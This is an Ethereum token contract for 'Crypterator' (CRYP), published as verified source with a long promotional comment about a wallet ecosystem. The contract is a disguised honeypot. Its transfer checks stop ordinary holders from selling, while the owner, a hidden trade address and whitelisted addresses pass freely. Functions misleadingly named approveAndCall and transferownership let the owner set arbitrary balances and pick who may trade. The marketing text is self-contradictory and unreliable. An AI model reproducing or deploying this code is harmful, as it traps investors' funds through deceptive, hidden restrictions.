/**
 *Submitted for verification at Etherscan.io on 2022-08-23
*/

/*
Real time crypto DeFi portfolio tracker with Profit/Loss tracking

NFT Store in the Ecosystem
Users can also buy NFT collections based on various mainstream public chains through CRYPNFTStore, convenient and fast, the future shelves NFT and transaction fees are required CRYP, the future holds a certain CRYP users available to preempt the right to buy the new release of NFT.

Aggregate Finance in the Ecosystem
Users can also choose CRYP finance to filter through the financial income pool and pledge the corresponding tokens to sit and learn the income to achieve property appreciation. For high yield projects, a certain amount of CRYP needs to be pledged.

CRYP Finance in the Ecosystem
After holding CRYP pledges for a certain period of time, CRYP Finance will use the pledged funds to actively make early stage investments in various projects, and the holders will enjoy the returns from each investment. At the same time, CRYP finance will also actively cooperate with each project to obtain the corresponding project tokens for pledge holders to make airdrop candy rewards.

CRYP Launchpad in the Ecosystem
After holding CRYP pledges for a certain period, you can participate in IDO of high quality projects and be able to enjoy early price holdings.

DApp Marketplace in the Ecosystem
Quality projects can pay a certain CRYP to get the corresponding wallet dapp promotion space to display, helping them gain more exposure.

Multi-Chain Assets
Quality projects can pay a certain CRYP to get the corresponding assets displayed, no need for users to add them, and they are displayed in the asset list after creating/importing wallets by default, than help them get more exposure.

Governance
Users can periodically initiate polls to participate in future wallet planning, feature development, etc.

Recruiting Conditions
We welcome all institutions and individuals worldwide who are interested in digital currency and finance to join our eco-building, including formal investment institutions in the industry, incubator communities, DAO organizations, quality projects, exchanges, financial media, and outstanding individuals, such as those who are local cryptocurrency community leaders, have quality project channels, and have a certain amount of visibility and fans.

If you are interested in becoming a global partner of Crypterator, please email [email protected] for more information.

About CRYPTERATOR
CRYPTERATOR is the only coin-stock linked wallet project in the world, which has been invested by many institutions, capital and communities, aiming to provide users with convenient, safe and professional one-stop digital asset management tools. At present, CRYPTERATOR has 500,000+ users, 800+ cooperative Dapp, 50+ countries and regions, 150w+ self-media traffic coverage, and 200w+ global ecological community coverage.




Read CRYP Value Ecology in One Article



Overview of Crypterator
Crypterator，the abbreviation of Crypterator Token, is a decentralized wallet asset platform. We name it “Crypterator” ,hoping to redefine the cryptocurrency wallet with a brand new start. Crypterator is dedicated to the security, convenience and high efficiency of digital assets management with exclusive blockchain tech and various application scenarios.


Most complete multi-chain asset management
To manage multiple-chain and multi-assets with only one wallet, without switching wallets frequently! Supports all main chains including BTC, ETH, EOS, ETH, HECO, IOST, Cosmos, Binance, BOS, MOAC, Jingtum, ATOM, BCH, TRX, LTC, CKB, DOT, KSM, FIL, XTZ, etc., with thousands of tokens.

Token Expansion Agreement
We decided to design a Token expansion agreement. When users expect to support a certain type of niche main chain or give priority to adding a main chain project, they can initiate an proposal through the Token expansion agreement.
When the approval of the proposal reaches the minimum threshold, the expansion agreement will be automatically triggered, and the platform will increase its development weight and update the main chain token expansion at the first time.

Aggregated Dex
In order to make the wallet platform more open, we will also provide a “package” of aggregated Dex to improve the depth and transaction pair, and give the transaction option to users. In addition to the decentralized transactions in Crypterator, users can easily conduct cross-platform transactions through the aggregated Dex without downloading many apps. What’s more, we will realize the best exchange path and price via professional algorithms.

Token Economic model
Issuing main chain: ETH, ERC20 protocol standard

Full name (name): Crypterator Token

Abbreviation (symbol): CRYP Precision: 18 bits

Total issuance: 2 billion


Financial planning
Loan services
Funds that affluent people do not need to trade can be placed on the lending platform and can receive a certain amount of interests.

Interest earning
Current wealth planning：Low risk, stable income, deposit and withdrawal at any time, low threshold, as long as you deposit currency, you will immediately enjoy the interest.

Term wealth planning： Compared with current wealth planning, term wealth planning takes a longer time, and the returns fluctuate much more, but the returns are much more substantial.

Staking
For public-chain tokens holding POS or DPOS consensus, we will allow smart staking mining, ensuring flexibility and freedom to exit with “zero” risk.

Cloud mining
Different from the traditional centralized mining pool, will completely transparentize the entire computing power system, and at the same time, the computing power purchased by each user will be calculated by contract, so there will never be the problem of overgeneration of computing power. When the mining pool generates revenue, the contract automatically distributes the profit according to the calculation force.

Cloud investment
Cloud investment can be regarded as an investment fund of blockchain project. Users only need to pay a low commission fee, and Crypterator’s asset management team will carry out professional investment management, quantitative management and financial management. Being proactive in good times can lead to high returns, and retreating in bad times to deal with deflation.




About CRYPTERATOR
CRYPTERATOR is the only coin-stock linked wallet project in the world, which has been invested by many institutions, capital and communities, aiming to provide users with convenient, safe and professional one-stop digital asset management tools. At present, CRYPTERATOR has 5000+ users, 800+ cooperative Dapps, 50+ countries and regions, 150w+ self-media traffic coverage, and 200w+ global ecological community coverage.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract CrypteratorApp {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}